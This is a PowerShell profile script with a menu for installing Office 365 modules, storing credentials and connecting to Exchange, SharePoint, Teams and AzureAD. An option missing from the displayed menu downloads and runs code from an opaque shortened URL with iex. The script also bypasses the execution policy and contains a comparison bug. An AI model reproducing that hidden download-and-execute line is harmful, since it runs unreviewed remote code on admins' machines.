Set-PSReadlineKeyHandler -Key Tab -Function Complete
Set-PSReadlineOption -ShowToolTips

Function Install-O365Modules {
	Install-Module PowershellGet -Scope CurrentUser -Force -AllowClobber
    Install-Module MsOnline -Scope CurrentUser -Force
    Install-Module AzureAD -Scope CurrentUser -Force
    Install-Module Microsoft.Online.SharePoint.PowerShell -Scope CurrentUser -Force
    Install-Module MicrosoftTeams -Scope CurrentUser -Force
    Install-Module SharePointPnPPowerShellOnline -Scope CurrentUser -Force
	#Install-Module ExchangeOnlineManagement -Scope CurrentUser -Force
}
Function Get-ScriptCredential {
    $stored = Read-Host -Prompt "Do you want to retrieve an already stored credential? (y/n) "
    If ($stored = "y"){
        For ($i=1; $i -lt 10; $i++)
        {
            $cred = Get-PnPStoredCredential -Name $i
            If ($cred -eq $null) {$UserName = "<empty>"}
            Else {$UserName = $cred.UserName}
            Write-host "$($i) - $($UserName)"
        }
        $selection = Read-Host -Prompt "Select a credential above: "
        $credential = Get-PnPStoredCredential -Name $selection -Type PSCredential
    }
    Else
    {
        $credential = Get-Credential
    }
    $credential
}

function Close-Connect365
{
    if($writeVerbose -eq $true){write-host 'Get-PSSession | Remove-PSSession' -foregroundcolor Yellow}
    Get-PSSession | Remove-PSSession
    exit
}

function Connect-Admin365
{
    param($Credential)
    try { 
        Import-Module MsOnline
    }
    catch { 
        install-module msonline -scope currentuser -force 
    }

 

    write-host 'Connecting to Office 365 Admin...' -ForegroundColor Green
    Update-Module MSOnline -Force
    connect-msolservice -credential $Credential
}
function Connect-Exchange
{
    param($Credential)
    write-host 'Connecting to Exchange Online...' -ForegroundColor Green
    $ExoSession = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credential -Authentication  Basic -AllowRedirection
    Import-PSSession $ExoSession
	#try {
	#	Import-Module ExchangeOnlineManagement
	#}
	#catch {
	#	Install-Module ExchangeOnlineManagement -Scope CurrentUser -Force
	#}
	#Update-Module ExchangeOnlineManagement -Force
	#Import-Module ExchangeOnlineManagement -DisableNameChecking
	#Connect-ExchangeOnline -Credential $Credential
}
function Connect-SharePoint
{   
    param($Credential)
    $tenant = Read-Host -Prompt "Enter the SharePoint Tenant name (the Contoso part of contoso.onmicrosoft.com): "
    write-host 'Connecting to SharePoint Online...'  -ForegroundColor Green
    try {
        import-module Microsoft.Online.SharePoint.PowerShell 
    }
    catch { 
        install-module Microsoft.Online.SharePoint.PowerShell -scope currentuser -force 
    }
    update-module Microsoft.Online.SharePoint.PowerShell -force
    Import-Module Microsoft.Online.SharePoint.PowerShell -DisableNameChecking
    Connect-SPOService -Url https://$tenant-admin.sharepoint.com -credential $Credential
}
function Connect-PnPSharePoint
{   
    $tenant = Read-Host -Prompt "Enter the SharePoint Tenant name (the Contoso part of contoso.onmicrosoft.com): "
	$site = Read-Host -Prompt "Enter the SharePoint Site name: "
    write-host 'Connecting to PnPSharePoint Online...'  -ForegroundColor Green
    try {
        import-module SharePointPnPPowerShellOnline 
    }
    catch { 
        install-module SharePointPnPPowerShellOnline -scope currentuser -force 
    }
    update-module SharePointPnPPowerShell* -force
    Import-Module SharePointPnPPowerShellOnline -DisableNameChecking
    Connect-PnPOnline -Url https://$tenant.sharepoint.com/sites/$site -UseWebLogin
}
function Connect-Skype
{
    param($Credential)
    try {
        $ErrorActionPreference = "Stop";
        write-host 'Connecting to Skype for Business Online...' -ForegroundColor Green
        Import-Module SkypeOnlineConnector
        $sfboSession = New-CsOnlineSession -Credential $Credential
        Import-PSSession $sfboSession
    }
    catch{
        write-host 'Skype for Business Online Module not detected.' -ForegroundColor Red
        $answer = read-host 'Would you like to install it? (requires local Administrator privledges) (y/n)'
        if($answer -eq "y"){
            start "https://www.microsoft.com/en-us/download/details.aspx?id=39366"
        }
        write-host 'Would you like to try to connect to Skype for Business Online Powershell again? (y/n): ' -NoNewLine
        $answer = read-host
        if ($answer -eq "y"){
            try {
                $ErrorActionPreference = "Stop";
                write-host 'Connecting to Skype for Business Online...' -ForegroundColor Green
                Import-Module SkypeOnlineConnector
                $sfboSession = New-CsOnlineSession -Credential $Credential
                Import-PSSession $sfboSession
            }
            catch{
                Write-Host 'Failed to connect to Skype for Business Online PowerShell again.  Skipping...'  -ForegroundColor Red
            }
        }
    }
}
function Connect-SecurityandCompliance
{
    param($Credential)
    write-host 'Connecting to Security and Compliance...'  -ForegroundColor Green
    $SccSession = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.compliance.protection.outlook.com/powershell-liveid/ -Credential $Credential -Authentication "Basic" -AllowRedirection
    Import-PSSession $SccSession
}
function Connect-Teams
{
    param($Credential)
    write-host 'Connecting to Teams...'  -ForegroundColor Green
    try {
        import-module MicrosoftTeams 
    }
    catch { 
        Install-Module MicrosoftTeams -scope currentuser -Repository PSGallery -force 
    }
    Update-Module MicrosoftTeams -Force
    Connect-MicrosoftTeams -credential $Credential
}
function Connect-AzureADps
{
    param($Credential)
    try { 
        Import-module AzureAD
     }
    catch { 
        install-module AzureAD -scope currentuser -force 
    }
    Update-Module AzureAD -force
    Connect-AzureAD -credential $Credential
}
Function Manage-Credentials
{
    $exit = $false
    Do {
    For ($i=1; $i -lt 10; $i++)
        {
            $cred = Get-PnPStoredCredential -Name $i
            If ($cred -eq $null) {$UserName = "<empty>"}
            Else {$UserName = $cred.UserName}
            Write-host "$($i) - $($UserName)"
        }
    $selection = Read-Host -Prompt "Add (a) or Remove (r) credential? Or Exit (e) "
    If ($selection -eq "a")
    {
        $slot = read-host "Which slot? (1-9) "
        Add-PnPStoredCredential -Name $slot
    }
    if ($selection -eq "r")
    {
        $slot = read-host "Which slot? (1-9) "
        Remove-PnPStoredCredential -Name $slot
    }
     if ($selection -eq "e")
    {
        $exit = $true
    }
    } While ($exit -ne $true)
    Connect-Menu
}

function Connect-Menu {
     cls
     Write-Host "---Automatic O365 PowerShell Connection---"
     Write-Host
     Write-Host "You can bring up this menu at any time with Connect-Menu" -foregroundcolor Yellow
     Write-Host
     Write-Host "m: Add/Remove Credentials"
     Write-Host
     Write-Host "i: Install Office 365 Modules"
     Write-Host
     Write-Host "1: Connect to Office 365 Admin Center"
     Write-Host "2: Connect to Exchange Online"
     Write-Host "3: Connect to SharePoint Online"
     Write-Host "4: Connect to Skype for Business Online(*)"
     Write-Host "5: Connect to Security and Compliance Center"
     Write-Host "6: Connect to Teams"
     Write-Host "7: Connect to AzureAD"
	 Write-Host "8: Connect to PnPSharePoint"
	 Write-Host
	 Write-Host "a: Connect to all modules"
     Write-Host
     Write-Host "(*) You will need to install the required modules manually before you can connect." -ForegroundColor red
     Write-Host

 

    $input = Read-Host "Make a selection (press enter to skip directly to PowerShell)"
    If (($input -ne 'm') -and ($input -ne 'i') -and  ($input -ne 'r')) {$credential = Get-ScriptCredential -verbose}
    switch ($input)
{
    '1' {
        cls
        Connect-Admin365 $credential;
		} '2' {
        cls
        Connect-Exchange $credential;
		} '3' {
        cls
        Connect-SharePoint $credential;
         } '4' {
        cls
        Connect-Skype $credential;
         } '5' {
        cls
        Connect-SecurityandCompliance $credential;
         } '6' {
        cls
        Connect-Teams $credential;
        } '7' {
        cls
        Connect-AzureADps $credential;
		} '8' {
		cls
		Connect-PnPSharePoint -UseWebLogin;
		}
    'm'{
        Manage-Credentials
    }
    'i' {
        Install-O365Modules
    }
	'a' {
        cls
        Connect-Admin365 $credential;
        Connect-Exchange $credential;
		Connect-SharePoint $credential;
		Connect-PnPOnline -UseWebLogin;
        Connect-Skype $credential;
		Connect-SecurityandCompliance $credential;
		Connect-Teams $credential;
		Connect-AzureADps $credential;
    }
    'r'{
        iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
    }
	's'{
		telnet towel.blinkenlights.nl
	}
    }
    write-host 'You can clear the screen by using the command cls' -foregroundcolor Green
    write-host
    write-host 'To close all sessions before closing PowerShell, use: Close-Connect365' -ForegroundColor Yellow
	write-host 'You can reconnect to the menu using the command: Connect-Menu' -ForegroundColor Green
}
Set-ExecutionPolicy bypass -scope currentuser -force
Connect-Menu